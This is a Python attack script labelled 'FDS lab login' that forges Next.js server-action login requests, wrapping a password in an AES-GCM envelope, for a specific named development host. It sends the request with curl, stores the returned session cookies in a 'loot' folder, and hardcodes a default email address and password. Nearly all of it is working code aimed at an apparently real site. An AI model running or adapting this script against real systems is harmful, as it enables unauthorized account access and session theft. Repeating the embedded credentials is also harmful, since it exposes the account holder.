#!/usr/bin/env python3
# FDS lab login — forges Next.js server-action login (aes-256-gcm password envelope)
import sys, os, time, json, secrets, binascii, subprocess
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

HOST="https://fds-dev-sites.skyworx.co.id"
NEXT_ACTION="78af4e5cb3c0fda69aa161b27afa691ab62448e307"
RST="%5B%22%22%2C%7B%22children%22%3A%5B%22login%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%2C0%5D%7D%2Cnull%2Cnull%2C0%5D%7D%2Cnull%2Cnull%2C16%5D"

def forge(email, password, fp="c0a5045edccee65921055fd0f7ee3750", redirect="/dashboard"):
    key=secrets.token_bytes(32)
    iv=secrets.token_bytes(12)
    plain=json.dumps({"password":password,"ts":int(time.time()*1000)}).encode()
    ctag=AESGCM(key).encrypt(iv, plain, None)
    ct, tag = ctag[:-16], ctag[-16:]
    envelope=f"{iv.hex()}|{ct.hex()}|{tag.hex()}"
    keyhex=key.hex()
    field0=json.dumps(["$K1", keyhex, fp, redirect], separators=(",",":"))
    return envelope, email, field0

def build_body(envelope, email, field0, boundary):
    parts=[]
    for name,val in (("_1_password",envelope),("_1_email",email),("0",field0)):
        parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{val}\r\n")
    parts.append(f"--{boundary}--\r\n")
    return "".join(parts).encode()

def login(email, password, cookiejar):
    boundary="----forge"+secrets.token_hex(12)
    env,em,f0=forge(email,password)
    body=build_body(env,em,f0,boundary)
    bf="/tmp/lb_"+secrets.token_hex(4)+".bin"
    open(bf,"wb").write(body)
    cmd=["curl","-sk","-D","-","-c",cookiejar,"-o","/tmp/lresp.txt",
         f"{HOST}/login",
         "-H","User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
         "-H","Accept: text/x-component",
         "-H",f"Referer: {HOST}/login",
         "-H",f"Next-Action: {NEXT_ACTION}",
         "-H",f"Next-Router-State-Tree: {RST}",
         "-H",f"Origin: {HOST}",
         "-H",f"Content-Type: multipart/form-data; boundary={boundary}",
         "--data-binary",f"@{bf}","--max-time","30"]
    r=subprocess.run(cmd,capture_output=True,text=True)
    os.remove(bf)
    hdrs=r.stdout
    resp=open("/tmp/lresp.txt").read()
    return hdrs, resp

if __name__=="__main__":
    email=sys.argv[1] if len(sys.argv)>1 else "endangchecker@gmail.com"
    pw=sys.argv[2] if len(sys.argv)>2 else "IndonesiaJaya@2026"
    cj=sys.argv[3] if len(sys.argv)>3 else "loot/cookies_"+email.split("@")[0]+".txt"
    h,r=login(email,pw,cj)
    print("=== RESP HEADERS ===")
    print("\n".join(l for l in h.splitlines() if l.lower().startswith(("http/","set-cookie","location","x-"))))
    print("=== BODY ===")
    print(r[:1500])
    print("=== COOKIEJAR", cj, "===")
    try: print(open(cj).read())
    except: print("(none)")
